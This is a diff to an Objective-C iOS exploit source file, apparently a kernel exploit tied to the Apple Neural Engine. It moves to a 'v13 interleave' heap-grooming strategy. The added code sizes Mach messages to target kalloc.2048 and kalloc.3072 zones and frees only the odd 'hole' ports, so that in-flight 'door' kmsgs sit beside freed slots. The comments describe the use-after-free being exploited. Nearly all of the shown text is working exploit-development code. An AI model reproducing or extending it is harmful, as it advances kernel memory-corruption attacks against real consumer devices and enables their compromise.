@@ -31,9 +31,21 @@
 #import "LabLocalTime.h"
 #import "LabDeviceProfile.h"
 
-#define P099_BUILD @"p099-aneprewire-v12-fireconfirm"
+#define P099_BUILD @"p099-aneprewire-v13-interleave"
 
 #define P099_INPUT_COUNT 254
+/* v13 INTERLEAVE LAW (the 21:38/21:40 v12 MAF rounds): the fill's crossing
+   element was FREED both times (MAF = modified-after-free) and the record
+   world's zone flips per boot (run1 = data.kalloc.2048, run2 = data.kalloc.
+   3072 — the ANE record-area kdata class varies). Steering shape: build the
+   zone state [door][door][FREE][door][door][FREE]... by (a) sending DOOR-
+   shaped msgs on the EVEN hole ports too, (b) freeing only the ODD holes
+   (half-drain, 1024 interleaved free slots), (c) dual-class door msgs —
+   even victims in the ANE-class msg (kdata 0x820 = kalloc.3072 bucket),
+   odd victims 0x7b0-class (kdata 0x7d4 = kalloc.2048 bucket) so a 2048-
+   record-world boot is covered too. An in-flight door kmsg then sits next
+   to every fresh pop on both sides. */
+#define P099_MSG_2048_WIRE 0x7b0
 #define P099_OUTPUT_COUNT 1
 #define P099_MODEL_KEY @"XVRC27/mach_msg_min/model.anehash"
 #define P099_DRAIN_COUNT 2048
@@ -237,8 +249,8 @@ static uint32_t p099_pk_len(void) {
         kdata = o99->ane_table_size;
     return kdata - 0x24u;
 }
-static BOOL p099_send_portkind_victim(mach_port_t port, uint32_t index) {
-    const uint32_t PK_LEN = p099_pk_len();  /* 0x7FC on A14 = kdata 0x820 */
+static BOOL p099_send_portkind_victim_len(mach_port_t port, uint32_t index, uint32_t wireLen) {
+    const uint32_t PK_LEN = wireLen ? wireLen : p099_pk_len();  /* 0x7FC on A14 = kdata 0x820; 0x7b0 = the 2048 bucket */
     uint8_t *buf = calloc(1, PK_LEN + 1);
     if (!buf) return NO;
     mach_msg_header_t *h = (mach_msg_header_t *)buf;
@@ -281,6 +293,9 @@ static BOOL p099_send_portkind_victim(mach_port_t port, uint32_t index) {
         return NO;
     }
     return YES;
+}
+static BOOL p099_send_portkind_victim(mach_port_t port, uint32_t index) {
+    return p099_send_portkind_victim_len(port, index, 0u);
 }
 
 /* v6 door readback (p073 v7d/v9 law inlined): clean port desc =
@@ -491,18 +506,27 @@ static void p099_recv_portkind_door(mach_port_t port, uint32_t idx) {
                 BOOL pkVictim = (g_p099_portkindN &&
                                  i >= P099_PAIR_COUNT - g_p099_portkindN);
                 if (pairs[i].hole && pairs[i].victim &&
-                    p099_send_msg(pairs[i].hole, i, 0) &&
+                    (g_p099_portkindN == P099_PAIR_COUNT && !(i & 1)
+                        ? p099_send_portkind_victim(pairs[i].hole, i)
+                        : p099_send_msg(pairs[i].hole, i, 0)) &&
                     (pkVictim
-                        ? p099_send_portkind_victim(pairs[i].victim, i)
+                        ? p099_send_portkind_victim_len(pairs[i].victim, i,
+                            (g_p099_portkindN == P099_PAIR_COUNT && (i & 1))
+                                ? P099_MSG_2048_WIRE : 0u)
                         : p099_send_msg(pairs[i].victim, i, 1))) pairOK++;
             }
+            /* v13 half-drain: free ONLY the odd pairs' holes (plain msgs) —
+               1024 interleaved free slots; the even holes hold DOOR msgs
+               in flight right next to them. */
             for (uint32_t i = 0; i < P099_PAIR_COUNT; i++) {
-                if (pairs[i].hole && p099_recv_payload(pairs[i].hole, NULL) == MACH_MSG_SUCCESS) holesFreed++;
+                if ((i & 1) && pairs[i].hole && p099_recv_payload(pairs[i].hole, NULL) == MACH_MSG_SUCCESS) holesFreed++;
             }
         }
         sync();
-        L(@"[*] groom: drain=%d/%d pairs=%d/%d holes-freed=%d",
+        L(@"[*] groom: drain=%d/%d pairs=%d/%d holes-freed=%d (v13 half-drain: odd holes only; even holes = DOOR msgs in flight)",
           drainOK, P099_DRAIN_COUNT, pairOK, P099_PAIR_COUNT, holesFreed);
+        if (g_p099_portkindN == P099_PAIR_COUNT)
+            L(@"[v13] interleave: even holes = DOOR-shaped (3072 bucket), odd victims = 0x7b0-class (2048 bucket); drain = odd holes only");
         if (!groomReady) L(@"[!] groom alloc failed - continuing WITHOUT holes (higher panic risk)");
 
         // ---- PRIMARY: bundled compiled espresso model via CoreML (P033 path) ----
